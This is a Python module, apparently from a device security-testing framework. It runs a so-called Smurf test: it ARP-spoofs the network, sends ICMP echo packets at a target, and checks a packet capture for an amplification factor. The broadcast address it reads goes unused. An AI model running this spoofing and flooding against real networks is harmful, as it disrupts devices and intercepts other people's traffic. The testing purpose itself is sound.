
from generic_attack import *
import logging
log = logging.getLogger(__name__)
from scapy.all import *
import threading
from arp_spoof import ArpSpoof

class Smurf(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(Smurf, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):
        global arpspoof
        arpspoof = ArpSpoof("ArpSpoof", self.config, self.device)
        self.running = True
        arp_status = {}
        tarp = threading.Thread(target=arpspoof.initialize, args=(arp_status,))
        tarp.start()
        time.sleep(5)

        target = self.device['ip']
        broadcast_addr = self.device['broadcast_ip']
        ip_hdr = IP(dst=target)
        icmpPacket = ip_hdr / ICMP()
        initialPacketSize = 0

        packetCount = self.config['packet_count']
        for x in range(0, packetCount):
            send(icmpPacket)
            time.sleep(1)
        arpspoof.shutdown()
        tarp.join()

        file_prefix = self.config["file_prefix"]
        filename = 'results/' + self.device['time'] + '_' + file_prefix + '_cap.pcap'
        pcap = rdpcap(filename)
        sessions = pcap.sessions()
        vulnerable= False
        for session in sessions:
            for packet in sessions[session]:
                try:
                    if packet['IP'].dst == target and packet['ICMP'].type==8:
                            initialPacketSize = len(packet)

                    if packet['IP'].src == target and packet['ICMP'].type==0 and ( not initialPacketSize == 0):
                            result.update({"amplification_factor": len(packet)/initialPacketSize})
                            vulnerable = True
                except:
                    pass

        if vulnerable:
            result.update({"status": "vulnerable"})
        else:
            result.update({"status": "not_vulnerable"})
        return



    def shutdown(self):
        global arpspoof
        arpspoof.shutdown()
        self.running = False


